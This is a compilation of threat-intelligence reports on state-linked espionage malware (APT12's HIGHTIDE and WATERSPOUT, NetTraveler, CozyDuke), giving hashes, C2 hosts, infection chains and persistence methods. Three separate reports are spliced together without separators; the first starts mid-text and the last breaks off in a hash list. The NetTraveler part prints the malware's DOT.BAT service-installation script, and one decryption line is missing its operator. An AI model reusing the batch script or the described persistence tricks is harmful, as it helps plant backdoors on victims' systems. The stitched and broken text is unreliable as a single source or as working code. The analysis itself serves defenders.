Attached to this email was a malicious Microsoft Word document ( MD5 : f6fafb7c30b1114befc93f39d0698560 ) that exploited CVE-2012-0158 .
It is worth noting that this email appeared to have been sent from another Taiwanese Government employee , implying that the email was sent from a valid but compromised account .
Figure 2 : APT12 Spearphishing Email .
The exploit document dropped the HIGHTIDE backdoor with the following properties :
MD5 6e59861931fa2796ee107dc27bfdd480 Size 75264 bytes Complie 2014-08-23 08:22:49 Time Import ead55ef2b18a80c00786c25211981570 Hash .
The HIGHTIDE backdoor connected directly to 141.108.2.157 .
If you compare the HTTP GET request from the RIPTIDE samples ( Figure 1 ) to the HTTP GET request from the HIGHTIDE samples ( Figure 3 ) you can see the malware author changed the following items : User Agent Format and structure of the HTTP Uniform Resource Identifier ( URI ) .
Figure 3 : HIGHTIDE GET Request Example .
Similar to RIPTIDE campaigns , APT12 infects target systems with HIGHTIDE using a Microsoft Word ( .doc ) document that exploits CVE-2012-0158 .
FireEye observed APT12 deliver these exploit documents via phishing emails in multiple cases .
Based on past APT12 activity , we expect the threat group to continue to utilize phishing as a malware delivery method .
MD5 File Name Exploit 73f493f6a2b0da23a79b50765c164e88 議程最新修正及注意事項.doc CVE-2012-0158 f6fafb7c30b1114befc93f39d0698560 0824.1.doc CVE-2012-0158 eaa6e03d9dae356481215e3a9d2914dc 簡易名冊0全國各警察機關主官至分局 CVE-2012-0158 長.doc 06da4eb2ab6412c0dc7f295920eb61c4 附 .doc CVE-2012-0158 53baedf3765e27fb465057c48387c9b6 103年第3屆通 錄.doc CVE-2012-0158 00a95fb30be2d6271c491545f6c6a707 2014 09 17 Welcome Reception for Bob CVE-2012-0158 and Jason_invitation.doc 4ab6bf7e6796bb930be2dd0141128d06 產諮會_Y103 ( 2 ) 委員會_從東協新興國家 CVE-2012-0158 崛起 ( 0825 ) .doc .
Figure 4 : Identified exploit documents for HIGHTIDE .
When the file is opened , it drops HIGHTIDE in the form of an executable file onto the infected system .
RIPTIDE and HIGHTIDE differ on several points : executable file location , image base address , the User Agent within the GET requests , and the format of the URI .
The RIPTIDE exploit document drops its executable file into the C : \Documents and Settings\ { user } \Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\ folder .
All but one sample that we identified were written to this folder as word.exe .
The one outlier was written as winword.exe .
Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28 .
THREEBYTE Malware Family .
On Monday August 25 , 2014 we observed a different spear phish email sent from lilywang823@gmail.com to a technology company located in Taiwan .
This spear phish contained a malicious Word document that exploited CVE-2012-0158 .
The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11 .
Similar to the newly discovered HIGHTIDE samples documented above , this malicious document dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
This backdoor had the following properties :
MD5 16e627dbe730488b1c3d448bfc9096e2 Size 75776 bytes Complie 2014-08-25 01:22:20 Time Import dcfaa2650d29ec1bd88e262d11d3236f Hash .
This backdoor sent the following callback traffic to video.csmcpr.com :
Figure 5 : THREEBYTE GET Request Beacon .
The THREEBYTE spear phishing incident ( while not yet attributed ) shared the following characteristics with the above HIGHTIDE campaign attributed to APT12 :
The THREEBYTE backdoor was compiled two days after the HIGHTIDE backdoors .
Both the THREEBYTE and HIGHTIDE backdoors were used in attacks targeting organizations in Taiwan .
Both the THREEBYTE and HIGHTIDE backdoors were written to the same filepath of C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
APT12 has previously used the THREEBYTE backdoor .
WATERSPOUT Malware Family .
On August 25 , 2014 , we observed another round of spear phishing emails targeting a high-technology company in Japan .
Attached to this email was another malicious document that was designed to exploit CVE-2012-0158 .
This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
The backdoor had the following properties :
MD5 f9cfda6062a8ac9e332186a7ec0e706a Size 49152 bytes Complie 2014-08-25 02:10:11 Time Import 864cd776c24a3c653fd89899ca32fe0b Hash .
The backdoor connects to a command and control server at icc.ignorelist.com .
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server .
GET / .
/ < 5 digit number > / < 4 character string > .php ? < first 3 characters of last string > _id= < 43 character string > = HTTP/1.1 Accept : image/jpeg , application/x-ms-application , image/gif , application/xaml+xml , image/pjpeg , application/x-ms-xbap , * / * User-Agent : Mozilla/4.0 ( compatible ; MSIE 8.0 ; Windows NT 6.1 ; Trident/4.0 ; SLCC2 ; .NET CLR 2.0.50727 ; .NET CLR 3.5.30729 ; .NET CLR 3.0.30729 ; .NET4.0C ; .NET4.0E ) Host : < C2 Location > Cache-Control : no-cache .
Figure 6 : Sample GET request for WATERSPOUT backdoor .
Although there are no current infrastructure ties to link this backdoor to APT12 , there are several data points that show a possible tie to the same actors :
Same initial delivery method ( spear phishing email ) with a Microsoft Word Document exploiting CVE-2012-0158 .
The same “ Tran Duy Linh ” Microsoft Word Exploit Kit was used in delivery of this backdoor .
Similar Targets were observed where the threat actors utilized this backdoor .
Japanese Tech Company Taiwanese Government Organizations Organizations in the Asia-Pacific Region that are of Interest to China The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors : C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\winword.exe WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor .
Although these points do not definitively tie WATERSPOUT to APT12 , they do indicate a possible connection between the WATERSPOUT campaign , the THREEBYTE campaign , and the HIGHTIDE campaign attributed to APT12 .
Conclusion .
FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset .
These development efforts may have resulted in the emergence of the WATERSPOUT backdoor .
Figure 7 : Compile dates for all three malware families .
APT12 ’ s adaptations to public disclosures lead FireEye to make several conclusions about this threat group :
APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed .
APT12 has the ability to adapt quickly to public exposures with new tools , tactics , and procedures ( TTPs ) .
Public disclosures may result in an immediate change in APT12 ’ s tools .
These changes may be temporary and FireEye believes they are aimed at decreasing detection of their tools until a more permanent and effective TTP change can be implemented ( e.g. , WATERSPOUT ) .
Though public disclosures resulted in APT12 adaptations , FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels .
Similarly , the public disclosure of APT12 ’ s intrusion at the New York Times also led to only a brief pause in the threat group ’ s activity and immediate changes in TTPs .
The pause and retooling by APT12 was covered in the Mandiant 2014 M Trends report .
Currently , APT12 continues to target organizations and conduct cyber operations using its new tools .
Most recently , FireEye observed HIGHTIDE at multiple Taiwan-based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan-based electronics company .
We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders .
Note : IOCs for this campaign can be found here .
This entry was posted in Botnets , Targeted Attack , Threat Intelligence , Threat Research and tagged advanced malware , advanced persistent threat , advanced targeted attack , advanced threat actor , APT12 , Targeted Attack by Ned Moran , Mike Oppenheim , Sarah Engle and Richard Wartell .
Bookmark the permalink .
NetTraveler APT Gets a Makeover for 10th Birthday .
We have written about NetTraveler before HERE and HERE .
Earlier this year , we observed an uptick in the number of attacks against Uyghur and Tibetan supporters using an updated version of the NetTraveler backdoor .
Here 's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014 .
The e-mail has two attachments , a non-malicious JPG file and a 373 KB Microsoft Word .DOC file .
`` Sabiq sot xadimi gulnar abletning qeyin-Qistaqta olgenliki File name ashkarilanmaqta.doc '' MD5 b2385963d3afece16bd7478b4cf290ce Size 381,667 bytes .
The .DOC file , which in reality is a `` Single File Web Page '' container , also known as `` Web archive file '' , appears to have been created on a system using Microsoft Office Simplified Chinese .
It contains an exploit for the CVE-2012-0158 vulnerability , detected by Kaspersky Lab products as Exploit.MSWord.CVE-2012-0158.db .
If run on a vulnerable version of Microsoft Office , it drops the main module as `` net.exe '' ( detected by Kaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr ) , which in turn installs a number of other files .
The main C & C module is dumped into `` % SystemRoot % \system32\Windowsupdataney.dll '' , ( detected by Kaspersky as Trojan Spy.Win32.TravNet.qfr ) .
Name WINDOWSUPDATANEY.DLL MD5 c13c79ad874215cfec8d318468e3d116 Size 37,888 bytes .
It is registered as a service ( named `` Windowsupdata '' ) through a Windows Batch file named `` DOT.BAT '' ( detected by Kaspersky Lab products as Trojan.BAT.Tiny.b ) :
@ echo off @ reg add .
@ echo off @ reg add `` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Svchost `` /v Windowsupdata /t REG_MULTI_SZ /d Windowsupdata /f @ reg add `` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata `` /v ImagePath /t REG_EXPAND_SZ /d % SystemRoot % \System32\svchost.exe k Windowsupdata /f @ reg add `` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata `` /v DisplayName /t REG_SZ /d Windowsupdata /f @ reg add `` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata `` /v ObjectName /t REG_SZ /d LocalSystem /f @ reg add `` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata `` /v ErrorControl /t REG_DWORD /d 1 /f @ reg add `` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata `` /v Start /t REG_DWORD /d 2 /f @ reg add `` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata\Parameters `` /v ServiceDll /t REG_EXPAND_SZ /d % SystemRoot % \system32\Windowsupdataney.dll /f .
To make sure the malware is n't running multiple times , it uses the mutex `` SD_2013 Is Running ! '' to mark its presence in the system .
Other known mutexes used by older and current variants include :
Boat-12 Is Running ! DocHunter2012 Is Running ! Hunter-2012 Is Running ! NT-2012 Is Running ! NetTravler Is Running ! NetTravler2012 Is Running ! SH-2011 Is Running ! ShengHai Is Running ! SD2013 is Running ! .
The malware configuration file is written to the `` SYSTEM '' folder ( as opposed to SYSTEM32 ) and has a slightly new format compared to `` older '' NetTraveler samples :
For the record , here 's what an older NetTraveler config file looks like :
Obviously , the developers behind NetTraveler have taken steps to try to hide the malware 's configuration .
Luckily , the encryption is relatively simple to break .
The algorithm is as follows :
for ( i=0 ; i < string_size ; i++ ) decrypted [ i ] =encrypted [ i ] ( i + 0xa ) ;
Once decrypted , the new config looks like this :
One can easily see the command-and-control ( C & C ) server in the screenshot above , which is `` uyghurinfo.com `` .
We identified several samples using this new encryption scheme .
A list of all the extracted C & C servers can be found below :
C & C server IP IP location Registrar Hong Kong , Albert Heng , SHANGHAI MEICHENG ssdcru.com 103.30.7.77 Trillion Company TECHNOLOGY United States , Los Angeles , TODAYNIC.COM uygurinfo.com 216.83.32.29 Integen Inc INC .
Hong Kong , Kowloon , SHANGHAI MEICHENG samedone.com 122.10.17.130 Hongkong Dingfengxinhui Bgp TECHNOLOGY Datacenter Hong Kong , Sun Network SHANGHAI MEICHENG gobackto.net 103.1.42.1 ( hong Kong ) Limited TECHNOLOGY SHANGHAI MEICHENG worksware.net N/A N/A TECHNOLOGY was Hong Kong , Sun Network SHANGHAI MEICHENG jojomic.com 202.146.219.14 ( hong Kong ) Limited TECHNOLOGY hong kong hung tai SHANGHAI MEICHENG angellost.net was 103.17.117.201 international holdings TECHNOLOGY hong kong hung tai SHANGHAI MEICHENG husden.com was 103.30.7.76 international holdings TECHNOLOGY .
We recommend blocking all these hosts in your firewall .
Conclusion .
This year , the actors behind NetTraveler celebrate 10 years of activity .
Although the earliest samples we have seen appear to have been compiled in 2005 , there are certain indicators that point to 2004 as the year when their activity started .
For 10 years NetTraveler has been targeting various sectors , with a focus on diplomatic , government and military targets .
NetTraveler victims by industry .
Most recently , the main focus of interest for cyber-espionage activities revolved around space exploration , nano-technology , energy production , nuclear power , lasers , medicine and communications .
The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can assume it will stay this way , perhaps for another 10 years .
COZYDUKE .
TLP : WHITE .
CONTENTS Introduction2 The CozyDuke toolset 2 Attack overview  2 Infection vector 2 Target details 2 Timeline2 Attribution & links 2 Technical Details  3 Initial infection 3 CozyDuke main dropper 3 CozyDuke main component 4 Overview4 Persistence4 Configuration data 4 Command and control communication 5 Tasks5 Modules6 Executables6 CozyDuke Evolution 6 CozyDuke Terminology and Naming 7 Appendix A | Sample hashes 8 Appendix B : IOCs 9 .
This whitepaper provides an overview of CozyDuke , a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations , such as governmental organizations and other entities that work closely with these institutions .
The CozyDuke toolset , which we believe has been under active development since at least 2011 , consists of tools for infecting targeted hosts , establishing and maintaining backdoor access to the hosts , gathering information from them and gaining further access to other hosts inside the victim organization .
Based on command and control ( C & C ) server information found being used by CozyDuke tools , we believe the CozyDuke toolset is used by at least one malicious actor who also uses , or at the least shares , infrastructure with actors using the known threats , MiniDuke and OnionDuke .
F-SECURE LABS SECURITY RESPONSE Malware analysis Whitepaper .
COZYDUKE Malware analysis 2 .
INTRODUCTION .
THE COZYDUKE TOOLSET .
CozyDuke , as referred to in this document , is a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations .
The core of the CozyDuke toolset is a modular attack platform consisting of a main component augmented by a set of additional modules implementing further functionality .
The CozyDuke toolset also includes multiple kinds of droppers for infecting hosts with CozyDuke or for executing additional tools from the CozyDuke toolset .
Finally , the CozyDuke toolset includes tools and scripts – some custom-written , others based on openly available tools – that are used for purposes such as gathering further information from infected hosts or for infecting additional hosts in the same target organization .
ATTACK OVERVIEW .
Infection vector .
We have observed CozyDuke being spread via email , which usually contain a link to a compromised website hosting a ZIP file ( although in at least one case , the file was hosted on Dropbox ) .
These files contain an executable that , upon execution , will write to disk and execute CozyDuke , while at the same time presenting the user with a decoy to divert attention .
The decoy is usually an uninteresting PDF , but we have also observed a Flash video of monkeys being presented as the decoy .
FIGURE 1 : C & C INFRASTRUCTURE CONNECTIONS BETWEEN COZYDUKE , MINIDUKE AND ONIONDUKE .
CozyDuke MiniDuke OnionDuke nostressjob.com grouptumbler.com overpict.com postmaster@grouptumbler.com John Kasai .
Target details .
We have reason to believe CozyDuke is being used to target governmental organizations and entities that work closely with such bodies .
Timeline .
We believe the current CozyDuke activity started at the end of January 2015 .
Most of the samples we have observed were compiled beginning from the end of January .
However , based on comparisons of recent CozyDuke samples against older samples we have obtained dating back as far as the end of 2011 , we believe CozyDuke has been under active development since at least 2011 .
Attribution & links .
We have strong evidence suggesting the group using CozyDuke is the same as or at the least shares command and control infrastructure with the group or groups using MiniDuke and OnionDuke .
Firstly , a CozyDuke sample from February of 2012 attempts to contact a C & C server at nostressjob.com .
This domain has previously been associated with known MiniDuke C & C infrastructure .
This same infrastructure has also been seen in use by OnionDuke .
Secondly , we also have reason to believe CozyDuke has , in some instances , downloaded and executed droppers for DLL files reminiscent of OnionDuke .
Specifically , the DLLs dropped have used file and export names also used by OnionDuke .
Additionally , the strings in the DLLs have been encrypted using the same algorithm used by OnionDuke .
This link is , however , not as conclusive as the infrastructure overlap .
COZYDUKE Malware analysis 3 .
TECHNICAL DETAILS .
INITIAL INFECTION .
Infection with CozyDuke begins with the victim receiving an email containing a link to a ZIP file .
This ZIP file will contain a single executable , usually a self-extracting RAR archive .
Upon execution , it will write two files to disk .
The first file is a decoy .
The decoy has usually been a PDF document but Flash videos have also been observed in some cases .
The second file extracted from the archive is a CozyDuke dropper .
This dropper will then proceed to write to disk the main CozyDuke components as well as an encrypted configuration file used by CozyDuke .
FIGURE 2 : THE COZYDUKE INFECTION FLOW .
ZIP file Malicious link Downloads ZIP file Extracts Self-extracting RAR Extracts Extracts CozyDuke main dropper Decoy document Encrypted CozyDuke configuration components file .
COZYDUKE MAIN DROPPER .
The main CozyDuke dropper , used for infecting hosts with CozyDuke , begins by checking whether the victim has an anti-virus product installed .
Should an installed product be found , it will be compared to a predetermined list of product names .
If the installed product matches a name on the list , the dropper will immediately exit .
Newer versions of the dropper will perform additional checks to ensure the dropper is not being executed inside a virtual machine or a known malware analysis sandbox environment .
Should either of these checks fail , the dropper will likewise exit immediately .
Next , the dropper will find and decrypt encrypted data stored as two PE resources embedded in the executable .
These resources are named with the hexadecimal identifiers 0x000A and 0x000B .
Both resources are structured similarily .
They begin with a four-byte value specifying the length of the included decryption key .
This decryption key immediately follows the length field .
Finally , the rest of the resource is the encrypted payload .
The encryption used is a simple XOR with a rotating key .
The first resource , 0x000A , contains as its payload a Microsoft cabinet archive .
This archive contains the CozyDuke components that the dropper will later install on the victim system .
The second resource , 0x000B , contains as its payload an XML file with instructions for the dropper on where to install the dropped components and what to name them .
The dropper will then proceed to write the CozyDuke components to the specified location .
The dropper will additionally copy the system file rundll32.exe to the install location for CozyDuke .
This file will also use a name specified in the droppers configuration file .
Finally , the dropper will use the copy of rundll32.exe to load and execute the CozyDuke main component .
COZYDUKE Malware analysis 4 .
COZYDUKE MAIN COMPONENT .
Overview .
The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke ’ s activity on a victim machine .
The main component is executed by the CozyDuke dropper using a copy of rundll32.exe .
The entrypoint function varies , but is always specified in the dropper configuration .
The most important functionalities offered by the main component are establishment of persistence , gathering of basic system information , communication with the C & C server and the execution of additional tasks , modules or executables as commanded by the C & C server .
Persistence .
CozyDuke may use multiple techniques for establishing persistence ; the following is one technique used .
Firstly , CozyDuke may set itself to be executed at system startup by adding a registry value under any of the following registry keys :
• HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ • HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ .
FIGURE 3 : SCREENSHOT OF A DECRYPTED COZYDUKE CONFIGURATION FILE .
• HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run • HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run .
The name of the registry value will usually be the filename , ( without the extension ) of the CozyDuke main component .
CozyDuke may also register itself as a Windows service or scheduled task .
Additionally , CozyDuke may utilize a technique known as COM-object hijacking [ 1 ] to establish persistence .
To achieve this , CozyDuke will “ hijack ” the registry entries for the COM object “ SharedTaskScheduler ” .
CozyDuke will modify the registry entries in such a way that any loading of the SharedTaskScheduler COM object will first load a special CozyDuke module that will ensure CozyDuke stays active on the victim host .
Configuration data .
The configuration data for CozyDuke is stored as a separate RC4-encrypted file that is written to disk by the CozyDuke dropper during initial infection .
The name of the encrypted configuration file on disk has been racss .
dat in all of the observed cases .
The decrypted file is formatted as XML with the UTF-16LE character encoding .
COZYDUKE Malware analysis 5 .
TABLE 1 : DETAILS OF KNOWN COZYDUKE C & C SERVERS .
Dropper SHA1 Protocol Domain/IP Path Port 75aeaee253b5c8ae701195e3b0f49308f3d1d932 HTTP www.sanjosemaristas .
com /app/index.php 80 75aeaee253b5c8ae701195e3b0f49308f3d1d932 HTTP www.cifss .
org /product_thumb/index.php 80 446daabb7ac2b9f11dc1267fbd192628cc2bac19 HTTP pvt.relance.fr /catalogue/json/index.php 80 87668d14910c1e1bb8bbea0c6363f76e664dcd09 HTTPS 200.119.128.45 /mobile.php 443 87668d14910c1e1bb8bbea0c6363f76e664dcd09 HTTPS 202.206.232.20 /rss.php 443 ea0cfe60a7b7168c42c0e86e15feb5b0c9674029 HTTPS www.getiton.hants .
org.uk /themes/front/img/ajax.php 80 f2ffc4e1d5faec0b7c03a233524bb78e44f0e50b HTTPS www.seccionpolitica .
com.ar /galeria/index.php 80 9b56155b82f14000f0ec027f29ff20e6ae5205c2 HTTPS 200.125.133.28 /search.php 443 9b56155b82f14000f0ec027f29ff20e6ae5205c2 HTTPS 200.125.142.11 /news.php 443 bf265227f9a8e22ea1c0035ac4d2449ceed43e2b HTTPS 203.156.161.49 /plugins/twitter.php 443 32b0c8c46f8baaba0159967c5602f58dd73ebde9 HTTPS 209.40.72.2 /plugins/fsearch.php 443 78e9960cc5819583fb98fb619b33bff7768ee861 HTTPS 210.59.2.20 /search.php 443 78e9960cc5819583fb98fb619b33bff7768ee861 HTTPS 121.193.130.170 /wp-ajax.php 443 ce9d077349638ffd3e1ad68cda76c12cfb024069 HTTPS 208.75.241.246 /msearch.php 443 ac2b5928f46069111f4334f650a7dbf1b5f026d5 HTTPS 183.78.169.5 /search.php 443 ac2b5928f46069111f4334f650a7dbf1b5f026d5 HTTPS 201.76.51.10 /plugins/json.php 443 bf9d3a45273608caf90084c1157de2074322a230 HTTPS 208.77.177.24 /fsearch.php 443 Note : Domain names intentionally broken .
In all CozyDuke samples from 2015 , the configuration data has been encrypted with the RC4 key B5 78 62 52 98 3E 24 D7 3B C6 EE 7C B9 ED 91 62 .
In CozyDuke samples from July of 2014 , the RC4 key has been embedded in the encrypted configuration file .
In this case , the encrypted configuration file will begin with a 4-byte value specifying the length of the included RC4 key .
This will be followed by the actual key .
Finally , the rest of the file will be the actual configuration data .
Command and control communication .
CozyDuke ’ s main method of communicating with its command and control server is using either HTTP or HTTPS .
The method of communication , as well as the address to connect to , are specified in CozyDuke ’ s configuration data .
In the cases we have observed , the configuration data for any single CozyDuke instance has included the details of either one or two C & C servers .
Listed above are details of known CozyDuke C & C servers .
We believe all of the ones listed are compromised servers .
In addition to its main communication method , CozyDuke also features the ability to use Twitter as a backup C & C channel .
In cases where CozyDuke utilizes this functionality , the twitter account to be used will be specified in CozyDuke ’ s configuration data .
We have only observed two samples where a backup Twitter account was actually specified in the configuration data .
These accounts were @ US2515 and @ monkey_drive .
Tasks CozyDuke ’ s primary purpose is the execution of tasks .
These tasks usually involve the execution of modules or executables providing additional functionality .
The main difference between the two is that modules are DLL files loaded in memory by the CozyDuke main component , whereas executables are PE executable files that CozyDuke will write to disk and execute .
For the purpose of managing tasks , the main component of CozyDuke implements 6 commands that the C & C server can specify .
These commands are briefly described in Table 2 ( overleaf ) .
REFERENCE I .
GData ; Paul Rascagneres ; COM Object hijacking : the discreet way of persistence : An Analysis of a new persistence mechanism in the wild ; published 30.10.2014 ; http://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html .
COZYDUKE Malware analysis 6 .
TABLE 2 : 6 COZYDUKE C & C SERVER COMMANDS .
Command Purpose Add Add task Delete Delete task Stop Stop task Modify Modify task or configuration Upload Upload data Download Download data .
The following chapter , CozyDuke Tasks , provides further information on the tasks CozyDuke has been observed executing .
COZYDUKE TASKS .
Based on samples obtained from our own collections and generously shared to us by a trusted source , we have been able to identify some of the tasks executed recently by CozyDuke .
These tasks can be divided into two categories .
The first consists of CozyDuke modules which are DLL files loaded in memory by the main component of CozyDuke for the purposes of extending CozyDuke ’ s functionality .
The second category consists of PE executable files that CozyDuke will write to disk and execute on the infected host .
These executables are usually droppers similar to those used to infect a host with CozyDuke .
In this case , however , instead of dropping CozyDuke , the executables may drop other executables , scripts or DLLs .
Once executed by CozyDuke , these executables function independently of CozyDuke ’ s main component .
Modules .
Listed below are the modules we have observed being used :
TABLE 3 : COZYDUKE MODULES .
Module Type Purpose Command Can be used to execute arbitrary execution commands by invoking C : \ module Windows\System32\cmd.exe Password stealer Will attempt to harvest stored module credentials from the victim NTLM stealer Will attempt to harvest credentials module stored on the victim host that are used as part of Windows NTLM user authentication System info Will attempt to gather module comprehensive information on the victim host ’ s configuration Screenshot Will take a screenshot of the victim module host .
Executables .
We have observed executables executed by CozyDuke for the following purposes :
• Dropping and executing scripts for collecting information and credentials from the victim organization ’ s Active Directory environment • Dropping and executing scripts for further penetrating the victim organization with the help of commonly available tools such as Mimikatz and PSExec • Dropping and executing additional malware with the same file and export naming conventions as OnionDuke and the same string encryption algorithm as OnionDuke .
These executables will implement their own methods of C & C communication and data exfiltration .
In many cases , the scripts utilized Microsoft OneDrive accounts for data transfer .
COZYDUKE EVOLUTION .
The earliest CozyDuke sample we have observed so far was compiled on the 29th of December , 2011 .
The sample in question was not an actual CozyDuke main component , but a CozyDuke module .
The earliest main component we observed was compiled on the 29th of February , 2012 .
The main component in question stores its strings and configuration in an unencrypted form .
Additionally , the configuration is stored embedded in the binary , not as a separate XML file in the manner of newer CozyDuke versions .
Even this oldest main component does however use XML for other purposes via the open-source Pugi-XML library .
The next CozyDuke main component we observed was compiled on the 30th of November , 2012 .
By then , the authors had switched to encrypting the strings and the configuration .
However , the configuration was still stored embedded in the binary .
Design-wise , this sample is a bit of an outlier .
Instead of being a DLL file , the main component is actually an EXE that , in addition to the configuration , embeds multiple DLLs that provide additional functionality to the main component .
Apart from the different design , functionally the main component is very similar to other CozyDuke main components .
It is possible the authors of CozyDuke were trying out a new design , but eventually decided to go back to the original .
The next CozyDuke main component we observed , compiled on the 2nd of July , 2014 , is again a DLL file .
By now , the authors of CozyDuke had switched from .
COZYDUKE Malware analysis 7 .
FIGURE 4 : TIMELINE OF COZYDUKE EVOLUTION .
30/11/12 Executable CozyDuke main component 426KB EXE Encrypted strings 26/2/15 Encrypted embedded configuration CozyDuke main component 29/12/11 820KB DLL Oldest known CozyDuke module Encrypted strings Unencrypted strings Encrypted external configuration 2012 2013 2014 2015 29/2/12 2/7/14 Oldest known CozyDuke main module CozyDuke main component 266KB DLL 279KB DLL Unencrypted strings Encrypted strings Unencrypted embedded configuration Encrypted external configuration .
an embedded configuration to the external XML formatted configuration file seen today .
We have yet to observe samples from 2013 , but we believe CozyDuke to have been under active development as well during that year .
Between 2012 and 2014 , the authors of CozyDuke appear to have performed significant refactoring of the CozyDuke codebase , even though functionally the differences are smaller .
Examples of this refactoring include for instance the switch from using the Pugi-XML library to using Microsoft ’ s MSXML 3.0 for XML-related functionality .
The latest CozyDuke main component we observed was compiled on the 26th of February , 2015 .
The core functionality of the latest sample is very similar to the previous sample from July of 2014 , but the authors of CozyDuke have implemented a lot of additional functionality , as the increase in size from 279KB to 820KB would also suggest .
TABLE 4 : COZYDUKE PDB STRINGS .
Compilation timestamp PDB string Mon Feb 13 13:07:04 2012 E : \Visual Studio 2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\tasks\bin\ ( UTC ) GetPasswords\exe\GetPasswords.pdb Wed Dec 28 13:23:04 2011 D : \Projects\Agent2011\Agent2011\Agent\tasks\bin\systeminfo\exe\systeminfo.pdb ( UTC ) Thu Jan 26 13:57:00 2012 \\192.168.56.101\true\soft\Agent\tasks\Screenshots\agent_screeshots\Release\agent ( UTC ) screeshots.pdb .
COZYDUKE TERMINOLOGY AND NAMING .
Based on logging strings , variable naming and PDB strings found in CozyDuke samples , we observed the following :
• The internal name for CozyDuke is “ Agent ” • The CozyDuke main component ’ s functionality revolves around the execution of “ tasks ” that are often associated with “ modules ” • It is possible that the name “ Agent ” is not the original internal name of CozyDuke and that the name was changed sometime in 2011 with the original project name being “ Agent_NextGen ” • Sometime in 2011 , CozyDuke was identified internally as being version 3 .
PDB strings found in early CozyDuke samples are listed in Table 4 ( below ) .
APPENDIX A 8 .
APPENDIX A | SAMPLE HASHES .
• 00f67deb6e435c68f8a39336c9effc45d395b134 • 8b357ff017df3ed882b278d0dbbdf129235d123d • 01d3973e1bb46e2b75034736991c567862a11263 • 8ba7932a40008881a4ed975f52271c0b679eaff2 • 034481acd945028f4521cf0eaa3685c6202f9e19 • 8bc2d5aa1f384d56f3e921bce5326de8ff4dce2d • 04aefbf1527536159d72d20dea907cbd080793e3 • 8c3ed0bbdc77aec299c77f666c21659840f5ce23 • 08facf0ae484f5bc7b066bbdd382e683fdfcba77 • 8cc326473fd30ab5c97709e5a91fb04e18e72e96 • 0a38765d599865dabc394287e61f5e8f6ac442c5 • 8f1ac45360196a7b5a1680ff839a131394e9d9b4 • 1051f814b33991a1f8e551759ead44b8ee7fc2c9 • 8f467b32f1ec0f3b2efe10b3fed2a14b16075702 • 1a3825ef1064c2bbea5169671ef62030b00875ca • 9319bf72000f8e468c182947dd5c82fb8b9ae419 • 1d734a26184005603605aab67eba76d7d5ec3b8c • 93d53be2c3e7961bc01e0bfa5065a2390305268c • 1e02eea130d17b9afb712d846612ab8bd6972183 • 93ee1c714fad9cc1bf2cba19f3de9d1e83c665e2 • 210bc99275368df7ea179055737cffc3a12a6614 • 94520b93510db0dc10387a65e0a46f45ab501226 • 23e20c523b9970686d913360d438c88e6067c157 • 975b86c329c537f763f94a3f12610304dd358ff8 • 2564d7d42384bd3dce7257ef4a0a4b0cedac635b • 9b56155b82f14000f0ec027f29ff20e6ae5205c2 • 259b4679c26625c452141861014fe2f2c336462b • 9dc6bbc34933ffecbfbb454788bab4230fcc2c65 • 26d030c93c517d63147f502bf6536c3914698821 • 9e156f41ff9c17692c9eba5bdb67ac14f0c0473f • 29686320a3f06030f7192ca5b4f3eb47e73cb470 • 9f8f1672594a6fbac43793c857dd7718e75f328a • 29a91e7823046f4ec3fd6b3fd1b442eaa92f3565 • a38ea2533e3dfa6339726aafd4bc2bc7e3eec529 • 31163d35c5a3caa5e82e1d9b0d1b4db8fbdd79fa • a7a00f35797db2db9302625be456671911896d27 • 32b0c8c46f8baaba0159967c5602f58dd73ebde9 • a99d8313876015fcf1b783d38fee9e9c3cde088c • 33beb7a410f1cd699733000b5b30b5e4eb2062ba • ac2b5928f46069111f4334f650a7dbf1b5f026d5 • 3583647ef8158e29e3c18413ece70c2851720926 • b26bc0a3e35c474f7099bd2b066f1680f3394b14 • 365cbfe32a79ce41b049dd85bb30afc51ba1ea6f • b2b2e5c5a6f8a07f051aab14fbec1f6607888b50 • 37144694cfa953ab7acd376c033beda45cc95f4d • 